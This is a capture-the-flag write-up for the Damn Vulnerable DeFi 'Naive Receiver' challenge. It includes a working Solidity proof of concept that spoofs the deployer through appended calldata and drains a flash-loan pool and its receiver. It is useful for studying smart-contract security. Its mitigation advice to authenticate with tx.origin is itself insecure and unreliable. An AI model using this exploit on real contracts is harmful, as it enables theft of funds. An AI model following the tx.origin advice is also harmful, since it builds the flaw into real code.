# Damn Vulnerable DeFi V4 - Naive Receiver

## Blog Post

## Introduction

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

## Scope

[Repository](https://github.com/NikolayPIvanov/damn-vulnerable-defi-v4)

- src/naive-receiver/BasicForwarder.sol
- src/naive-receiver/FlashLoanReceiver.sol
- src/naive-receiver/Multicall.sol
- src/naive-receiver/NaiveReceiverPool.sol

## Notes

### 1. Trusted Forwarder Requirement

One crucial element in this setup is the trusted forwarder. All requests must pass through this forwarder, which handles certain aspects of the transaction, such as the sender’s address, before the call reaches the actual contract. While this is intended to ensure secure routing of requests, the way _msgSender is determined in the receiving contract can introduce subtle vulnerabilities.

### 2. `_msgSender` and the Last 20 Bytes

Within the `NaiveReceiverPool` contract, the `_msgSender` function uses the last 20 bytes of the call data to identify the caller. This design can be problematic because it allows an attacker to craft malicious calldata, effectively impersonating any address simply by controlling those final bytes.

### 3. Draining the Pool with Repeated Flash Loans

Armed with the ability to impersonate addresses, an attacker can:

Continuously request flash loans (for example, taking 10 loans of 1 ETH each if the pool holds 10 ETH).
Force the receiver to repay these loans repeatedly until the pool is fully drained.
Since the fee receiver for these transactions is the contract deployer, and all the fees accumulate under that deployer address, the attacker’s ability to impersonate the deployer becomes especially powerful.

### 4. Fee Receiver and Deployer Impersonation

Because the fee receiver equals the deployer, all protocol fees (or WETH in certain cases) end up under a single address controlled by the deployer. By forging the `_msgSender` to impersonate the deployer:

The attacker can funnel WETH from the NaiveReceiverPool under the deployer’s deposits.
The attacker then finalizes the exploit by calling the withdraw function.

## Analysis

### [H-1] Malicious user can craft custom message sender address impersonating deployer (address spoofing)

#### Description

By crafting the calldata and setting the last 20 bytes to the deployer address, we can impresonate the deployer due to the bug in `NaiveReceiverPool::_msgSender`. Moreover, we can leverage the `Multicall` functionality in conjunction with `[M-1]`.

- Execute 10 flashloans - this will drain the `receiver` address
- Execute 1 withdraw - impersonating the deployer.

[Likelikehood] - High

#### Impact

A malicious user can drain the total funds in the pool, thus stealing the funds and leaving nothing left. This is extremely critical.

#### Proof of Concepts

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory calls = new bytes[](11);

    // Move the 10 ETH from receiver to the pool
    bytes memory drainReceiverCall = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 1 ether, bytes("")));
    for (uint256 i = 0; i < 10; ++i) {
        calls[i] = drainReceiverCall;
    }

    // deployer == feeRecipient
    // At this point all the funds will be under deposits(deployer)
    uint256 total = WETH_IN_POOL + WETH_IN_RECEIVER;
    bytes memory drainPoolCall = abi.encodePacked(
        abi.encodeCall(pool.withdraw, (total, payable(player))),
        deployer // impersonate the deployer by adding the address the last 20 bytes the of calldata
    );

    calls[10] = drainPoolCall;

    BasicForwarder.Request memory request = BasicForwarder.Request(
        player, // from
        address(pool), // target
        0, // value
        1_000_000, // gas (pass 1M just for test)
        forwarder.nonces(deployer), // nonce
        abi.encodeCall(pool.multicall, (calls)), // data
        block.timestamp
    );

    bytes32 digest = forwarder.getDataHash(request);
    bytes32 domainSeparator = forwarder.domainSeparator();

    bytes32 digestHash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, digest));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    require(forwarder.execute(request, signature));

    require(weth.transfer(recovery, total));
}
```

#### Recommended mitigation

The `NaiveReceiverPool::_msgSender` function should be refactored to get the true address of origin of the transaction e.g. `tx.origin`.

Another approach would be to include the message sender as a function parameter and forward it from the `BasicForwarder` smart contract to the `NaiveReceiverPool`.

### [M-1] Anyone can start a flashloan transaction from the receiver's behalf

#### Description

In `FlashLoanReceiver` which holds 10 WETH initially, there is no check for the
origin of the flashloan, which means it can be drained from the initial balance of 10 ETH and transferring it to the pool.

[Likelikehood] - High

#### Impact

A malicious use can transfer the funds from the receiver to the pool, conflicting with the intend of the receiver.

#### Proof of Concepts

We can simulate this easily by using the player as the sender and calling `NaiveReceiverPool::flashLoan` and specifying the receiver as the address to get the loan.

```solidity
function test_drainReceiver() public {
    vm.prank(player);

    console.log("Balance before: ", weth.balanceOf(address(receiver)));
    pool.flashLoan(receiver, address(weth), 1 ether, bytes(""));
    console.log("Balance after: ", weth.balanceOf(address(receiver)));
}
```

*Results*

```solidity
Logs:
  Balance before:  10000000000000000000
  Balance after:  9000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 941.72µs (142.79µs CPU time)
```

#### Recommended mitigation

If we want to restrict who can create flashloan on the behalf of the receiver, we can check the `tx.origin` if it is the owner/deployer of the `NaiveReceiverPool`.

Alternatively, we can create an array that only the owner of the `FlashLoanReceiver` can set. The check of the `tx.origin` should be placed in the `FlashLoanReceiver::onFlashLoan`.
